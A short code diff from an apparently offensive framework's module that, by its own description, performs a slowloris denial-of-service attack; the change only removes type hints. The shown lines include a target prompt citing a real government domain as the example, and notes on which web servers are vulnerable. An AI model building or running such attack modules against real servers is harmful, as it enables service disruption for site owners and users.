@@ -6,7 +6,7 @@ from server.modules.helper import *
 
 
 class Module(ModuleABC):
-    def get_info(self) -> dict:
+    def get_info(self):
         return {
             "Author": ["Marten4n6"],
             "Description": "Perform a slowloris DoS attack.",
@@ -17,12 +17,12 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def get_setup_messages(self) -> List[str]:
+    def get_setup_messages(self):
         return [
             "Target to attack (example: fbi.gov:443): "
         ]
 
-    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+    def setup(self, set_options):
         # This attack only works on Apache 1x, 2x, dhttpd, and some other minor servers.
         # Servers like nginx are not vulnerable to this form of attack.
         # If no port is specified 80 will be used.
